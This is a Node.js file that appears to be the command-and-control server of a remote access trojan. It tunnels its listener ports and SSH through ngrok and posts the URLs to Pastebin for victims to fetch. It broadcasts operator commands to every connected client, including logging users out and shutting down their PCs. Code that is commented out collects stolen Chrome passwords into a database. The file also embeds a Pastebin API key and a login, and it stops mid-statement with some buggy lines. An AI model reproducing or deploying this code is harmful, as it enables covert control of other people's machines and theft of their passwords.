var net = require('net');
var readline = require('readline');
var ngrok = require('ngrok');
var paste = require("better-pastebin");
var sqlite3 = require('sqlite3');
var db = new sqlite3.Database("userdata.db");
var colors = require('colors');
var CryptoJS = require('crypto-js');
var base64 = require('base-64');
var jose = require('node-jose');
var NodeRSA = require('node-rsa');


var keystore = jose.JWK.createKeyStore();

var clients = [];
var names = [];
var chromePasswords = [];

Start();
// Start a TCP Server
net.createServer(function (socket) {
  
  socket.name = socket.remoteAddress + ":" + socket.remotePort;
  clients.push(socket);


  socket.on('data', function (data) {

    arr = data.toString().split("|||");
    //Procces data recived using message prefix
    console.log(arr[0]+ "\n")
    console.log(arr[1]+ "\n")

    switch(arr[0]) {
      case "priv":
        socket.priv = base64.decode(arr[1])
        key = new NodeRSA({b: 2048});
        key.importKey(soket.serverpriv, 'pkcs1-public-der');
        socket.priv = key.decrypt(socket.priv)
        break;

      case "pub":
        keystore.add(arr[1], "pkix").then(function(result) {
          // {result} is a jose.JWK.Key
          
        });
        socket.pub = arr[1] //PKIX encoded
        console.log('got client pub')

        // Gen keypair
        key = new NodeRSA({b: 2048});
        socket.serverPub = key.exportKey('pkcs1-public-der');
        socket.serverPriv = key.exportKey('pkcs1-der');
        console.log("generated and saved keys for server")
        // send serverpriv
        clientKey = new NodeRSA({b: 2048});
        clientKey.importKey(socket.pub, 'pkcs1-public-der'); //check key encodig
        socket.write(clientKey.encrypt(socket.serverPriv, 'base64')+"\n")
        console.log('send priv server ' + base64.encode(socket.serverPriv))
        // Listen for soket.priv 
        break;

      case "user":
        socket.nick = arr[1] +" ("+ socket.remoteAddress + ":" + socket.remotePort+")";
        names.push(socket.nick);
          console.log("New user connected: ".america +socket.nick+"\n");

        break;
      case "yn":
          console.log("\n" + "default" + "\n");
        break;
      /*case "pass":
          arrOfPass = arr[1].split("\n");
          chromePasswords.push(arrOfPass);
        arrOfPass.forEach(function (entry) {
        	data = entry.split(">>");
        	savePassToSQLite(data[0], data[1], data[2]);
            });
        break;*/

      default:
          console.log("\n" + arr[1] + "\n");
        break;
    }
    });

    socket.on('end', function () {
   		clients.splice(clients.indexOf(socket), 1);
      if (socket.nick != null) {
        console.log("User disconnected: ".green + socket.nick)
      } else {
        console.log("User disconnected: ".green + socket.name)
      }
  	});
}).listen(4434);


//Boss port
/*net.createServer(function (socket) {
    socket.on('data', function (data) { 
      sendCommand(data);
      console.log("Recived cmd from 8000\n".america);
    });
 }).listen(8000);*/


//Promt for commands
function Start() {
  getPublicIP()
  console.log("Chat server running\n".rainbow);
  var rl = readline.createInterface(process.stdin, process.stdout);
  rl.setPrompt('Command -> ');
  rl.prompt();
  rl.on('line', function (line) {
      sendCommand(line);
      rl.prompt();
    }).on('close',function(){process.exit(0);});
}
function getPublicIP() {

  //Create pastebin object
  paste.setDevKey("6624699f38cac4c04962afe4ed8730e0");
  paste.login("efel", "password", function (success, data) {
    if (!success) {
      console.log("Failed (" + data + ")".red);
      return false;
      }
  });
  
  //Get url and links it to port 4434, then save to pastebin
  ngrok.connect({proto: 'tcp', addr: 4434, region: 'eu'}, function (err, url) {
          console.log("NGrok Url:  ".green + url.blue);
          updatePastebin(url)
      }
  );
  ngrok.connect({proto: 'tcp', addr: 8000, region: 'eu'}, function (err, url) {
          console.log("NGrok Url boss:  ".green + url.blue);
          updatePastebinBoss(url)
      }
  );

  ngrok.connect({proto: 'tcp', addr: 22, region: 'eu'}, function (err, url) {
          console.log("SSH url:  ".green + url.blue);
      }
  );

}

function sendCommand(command) {
    if (command === "users") names.forEach(function (name) { console.log(name + " "); });
    else if (command == "help") console.log("Usage: [command] [target (* for all)] [argumets (spaces are -)]\nmsg: ok messagebox\nlo: logs out\noff: shutdowns pc\nyn: yes or no message\nweb: opens");
    else if (command == "passlist") console.log(chromePasswords);
    else {
        if (command != "" && command != "\n") {
            clients.forEach(function (client) {
                //Add syntax check
                client.write(command + " \n");
            });
        }
    }
}
/*
function savePassToSQLite(url, username, password) {
    db.serialize(function () {
        var stmt = db.prepare("INSERT INTO ChromeAccounts (URL, Username, Password) VALUES (? ,?, ?)");
        stmt.run(url, username, password);
        stmt.finalize();
    });
}*/

function updatePastebin(text) {
    paste.edit("BuG97BSk", text, function (success, data) {
      if (success) {
        if (text != data) {
          console.log('failed to update pastebin!!!'.bgBlue.red)
          console.log(text +" != "+ data)
          updatePastebin(text)
        }
        console.log("Updated pastebin ".cyan + "(client)".red);
        console.log("Client pastebin now: ".cyan + data.cyan)
      }
    });
}
function updatePastebinBoss(text) {
    paste.edit("LWK9KdSW", text, function (success, data) {
      if (success) {
        if (text != data) {
          console.log('failed to update pastebin!!!'.bgBlue.red)
          console.log(text +" != "+ data)
          updatePastebinBoss(text)
        }
        console.log("Updated pastebin ".cyan+ "(boos)".red)
        console.log("Boss pastebin now: ".cyan + data.cyan)
      }
    });
}




//Encrypt
var ciphertext = CryptoJS.AES.encrypt







